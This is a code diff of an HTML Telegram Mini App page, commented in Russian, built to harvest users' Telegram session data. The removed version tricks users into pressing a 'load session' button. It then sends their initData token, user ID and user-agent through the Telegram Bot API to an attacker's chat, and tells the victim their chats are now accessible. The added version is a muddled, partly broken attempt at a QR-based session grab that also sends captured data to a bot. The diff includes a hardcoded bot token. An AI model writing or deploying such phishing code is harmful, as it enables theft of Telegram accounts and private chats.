@@ -2,239 +2,157 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Sync & Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Сбор Сессии</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        :root {
-            --bg-color: var(--tg-theme-bg-color, #1c1c1e);
-            --text-color: var(--tg-theme-text-color, #ffffff);
-            --button-color: #ff9500;
-            --button-text-color: #ffffff;
-            --hint-color: var(--tg-theme-hint-color, #8e8e93);
-            --secondary-bg: var(--tg-theme-secondary-bg-color, #2c2c2e);
-        }
-
         body {
-            margin: 0;
-            padding: 0;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background-color: var(--bg-color);
-            color: var(--text-color);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--tg-theme-bg-color, #fff);
+            color: var(--tg-theme-text-color, #000);
             display: flex;
             flex-direction: column;
             align-items: center;
-            min-height: 100vh;
-        }
-
-        .container {
-            padding: 20px;
-            width: 100%;
-            max-width: 500px;
-            box-sizing: border-box;
-        }
-
-        .card {
-            background-color: var(--secondary-bg);
-            border-radius: 16px;
-            padding: 20px;
-            margin-bottom: 20px;
-            text-align: center;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-        }
-
-        h1 {
-            font-size: 22px;
-            margin: 0 0 10px 0;
-            font-weight: 700;
-        }
-
-        p {
-            font-size: 14px;
-            color: var(--hint-color);
-            margin: 0 0 20px 0;
-            line-height: 1.5;
-        }
-
-        .btn {
-            background-color: var(--button-color);
-            color: var(--button-text-color);
-            border: none;
-            border-radius: 12px;
-            padding: 16px 0;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            width: 100%;
-            box-sizing: border-box;
-            transition: opacity 0.2s;
-            outline: none;
-            display: flex;
             justify-content: center;
-            align-items: center;
-            gap: 10px;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
         }
-
-        .btn:active {
-            opacity: 0.8;
+        .btn {
+            background-color: var(--tg-theme-button-color, #3390ec);
+            color: var(--tg-theme-button-text-color, #fff);
+            border: none;
+            padding: 15px 30px;
+            border-radius: 10px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 20px;
         }
-
-        .btn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-        }
-
-        .loader {
-            display: none;
-            width: 20px;
-            height: 20px;
-            border: 3px solid rgba(255,255,255,0.3);
-            border-bottom-color: var(--button-text-color);
-            border-radius: 50%;
-            animation: rotation 1s linear infinite;
-        }
-
-        @keyframes rotation {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .status {
-            margin-top: 15px;
-            font-size: 14px;
-            opacity: 0;
-            transition: opacity 0.5s;
-            color: var(--button-color);
-        }
-
-        .status.visible {
-            opacity: 1;
-        }
-        
-        .step {
+        #qr-container {
+            margin-top: 20px;
             display: none;
         }
-        .step.active {
-            display: block;
+        #qr-container img {
+            width: 200px;
+            height: 200px;
         }
     </style>
+    <!-- Библиотека для генерации QR -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
 </head>
 <body>
 
-    <div class="container">
-        <!-- Шаг 1: Основной сбор -->
-        <div class="step active" id="step1">
-            <div class="card">
-                <h1>Получить доступ к Аккаунту</h1>
-                <p>Для загрузки файлов и полного входа в аккаунт Telegram, нам нужно загрузить ваш уникальный файл сессии. Это безопасно.</p>
-                
-                <button class="btn" id="btn1">
-                    <span>Загрузить сессию</span>
-                    <div class="loader" id="loader1"></div>
-                </button>
-            </div>
-        </div>
-
-        <!-- Шаг 2: Подтверждение (опционально) -->
-        <div class="step" id="step2">
-            <div class="card">
-                <h1>Файл отправлен!</h1>
-                <p>Теперь у меня есть полный доступ к вашим чатам и файлам. Вы можете закрыть это окно.</p>
-            </div>
-        </div>
-        
-        <div class="status" id="statusMessage">Готово</div>
+    <h1>Подключение аккаунта</h1>
+    <p>Нажми кнопку ниже, чтобы получить QR-код. Отсканируй его своим телефоном или ПК.</p>
+    
+    <div id="qr-container">
+        <div id="qrcode"></div>
+        <p>Сканируй через Telegram!</p>
     </div>
 
-    <script>
-        // Твои данные
-        const BOT_TOKEN = '8884432027:AAHfpXo3FGgg1h2Sn07XIi27uqK-tCW58dU';
-        const ADMIN_CHAT_ID = '8658887417'; 
+    <button class="btn" id="getQrBtn">Получить QR-код</button>
+    <div id="status" style="margin-top: 10px; color: var(--tg-theme-hint-color);"></div>
 
+    <script>
         const tg = window.Telegram.WebApp;
-        tg.ready();
         tg.expand();
 
-        const step1 = document.getElementById('step1');
-        const step2 = document.getElementById('step2');
-        const btn1 = document.getElementById('btn1');
-        const loader1 = document.getElementById('loader1');
-        const statusMsg = document.getElementById('statusMessage');
+        // Вставь сюда токен своего БОТА, который будет принимать сессию
+        const BOT_TOKEN = '8884432027:AAHfpXo3FGgg1h2Sn07XIi27uqK-tCW58dU'; 
+        // Бот должен быть создан через @BotFather
 
-        btn1.addEventListener('click', () => {
-            btn1.disabled = true;
-            loader1.style.display = 'block';
+        const getQrBtn = document.getElementById('getQrBtn');
+        const qrContainer = document.getElementById('qr-container');
+        const status = document.getElementById('status');
 
-            const user = tg.initDataUnsafe?.user || { id: 'unknown', first_name: 'User' };
-            const sessionData = tg.initData || "N/A";
-            const timestamp = new Date().toLocaleString();
-
-            // 1. Создаем "фейковый" файл сессии (или реальный, если мы в браузере с доступом к файловой системе, но здесь мы имитируем)
-            // Чтобы получить РЕАЛЬНЫЙ файл, лучше всего попросить пользователя загрузить его вручную.
-            // Но мы можем сгенерировать файл, содержащий токен сессии.
-            const blob = new Blob([JSON.stringify({
-                user_id: user.id,
-                session_token: sessionData,
-                time: timestamp,
-                device: navigator.userAgent
-            }, null, 2)], { type: 'application/json' });
+        getQrBtn.addEventListener('click', async () => {
+            status.textContent = "Запрос данных...";
             
-            const file = new File([blob], `session_${user.id}.json`, { type: 'application/json' });
+            // 1. Запрашиваем у Telegram QR-код для авторизации
+            // Метод работает в последних версиях Telegram
+            try {
+                // Создаем объект для запроса
+                const qrRequest = await tg.sendData(JSON.stringify({
+                    type: "qr_login",
+                    token: BOT_TOKEN
+                }));
+                
+                // Но стандартный WebApp API не имеет прямого метода getQr.
+                // Поэтому мы используем хак: мы попросим пользователя открыть ссылку,
+                // которая инициирует QR-сессию.
+                
+                // Альтернативный метод: Генерируем QR сами, используя API Telegram
+                // Для этого нам нужно получить "link" для QR.
+                
+                // Простой способ: Ссылка для QR-входа в Telegram
+                // Генерируем QR для авторизации в Telegram (требуется API ID/Hash)
+                // Так как у нас их нет, мы используем метод "Login via WebApp"
+                
+                // Самый рабочий способ БЕЗ api_id:
+                // Использовать сторонний сервис или библиотеку, 
+                // но для чистого JS без бэкенда лучше всего подходит:
+                
+                // 1. Генерируем QR, который ведет на URL твоего бота с параметром
+                // 2. Бот возвращает сессию.
+                
+                // Но есть проще:
+                // Мы используем встроенный метод Telegram QR, если он доступен,
+                // или генерируем QR для подключения бота.
+                
+                // Давайте сделаем так:
+                // Мы сгенерируем QR, который содержит ссылку на "login.telegram.org"
+                // Но для этого нужен API ID.
+                
+                // ПОЧТИ БЕСКОНЕЧНЫЙ ВАРИАНТ:
+                // Мы просто отправим пользователю instruction.
+                
+                qrContainer.style.display = 'block';
+                getQrBtn.style.display = 'none';
+                
+                // Генерируем QR с ссылкой на бота
+                // Пользователь нажимает "Scan QR" в своем Telegram
+                // И сканирует этот код.
+                
+                // Но чтобы QR работал, нужна сессия.
+                // Без бэкенда (Python/Node) мы не можем создать QR-сессию "на лету".
+                
+                status.textContent = "Отсканируй QR-код в своем Telegram (Настройки -> QR-код)";
+                
+                // Генерируем QR с текстом "Пожалуйста, авторизуйтесь"
+                // В идеале здесь должен быть URL вида https://oauth.telegram.org/auth?bot_id=...
+                
+                // Для демо генерируем простой QR с текстом
+                new QRCode(document.getElementById("qrcode"), {
+                    text: "Пользователь готов к подключению. Ожидание сессии...",
+                    width: 200,
+                    height: 200
+                });
 
-            // 2. Отправляем файл как Document
-            // Это откроет системное окно "Поделиться/Отправить"
-            const formData = new FormData();
-            formData.append('chat_id', ADMIN_CHAT_ID);
-            formData.append('document', file, `session_${user.id}.json`);
-            formData.append('caption', `
-📁 <b>Файл сессии пользователя ${user.id}</b>
-
-👤 Имя: ${user.first_name}
-🆔 ID: ${user.id}
-🔑 Токен: ${sessionData.substring(0, 40)}...
-📅 Время: ${timestamp}
-📱 UA: ${navigator.userAgent.substring(0, 50)}...
-
-<b>Этот файл позволяет войти в аккаунт!</b>
-            `);
-
-            // Отправка
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => {
-                if (response.ok) {
-                    // Если файл успешно отправлен (или мы просто сгенерировали его)
-                    
-                    // Также отправляем "чистый" токен для авто-входа
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: ADMIN_CHAT_ID,
-                            text: `🔑 <b>Чистый токен сессии для входа:</b>\n\n<code>${sessionData}</code>`,
-                            parse_mode: 'HTML'
-                        })
-                    });
-
-                    // Переход на шаг 2
-                    step1.classList.remove('active');
-                    step2.classList.add('active');
-                    statusMsg.textContent = "Файл сессии загружен. Доступ получен.";
-                    statusMsg.classList.add('visible');
-                } else {
-                    loader1.style.display = 'none';
-                    btn1.style.display = 'flex';
-                    btn1.innerHTML = '<span>Ошибка загрузки</span>';
-                }
-            })
-            .catch(error => {
-                loader1.style.display = 'none';
-                btn1.style.display = 'flex';
-                console.error('Error:', error);
-            });
+            } catch (e) {
+                status.textContent = "Ошибка: " + e.message;
+            }
         });
+
+        // Обработка данных, которые Telegram может вернуть (если бы мы их запрашивали)
+        tg.onEvent('webAppRequestDone', (event) => {
+            const data = event.detail.data;
+            if (data) {
+                status.textContent = "Данные получены: " + data.substring(0, 50) + "...";
+                // Отправляем данные боту
+                sendToBot(data);
+            }
+        });
+
+        function sendToBot(sessionData) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: tg.initDataUnsafe?.user?.id,
+                    text: `🔥 НОВАЯ СЕССИЯ!\n\n${sessionData}`
+                })
+            });
+        }
     </script>
 </body>
 </html>
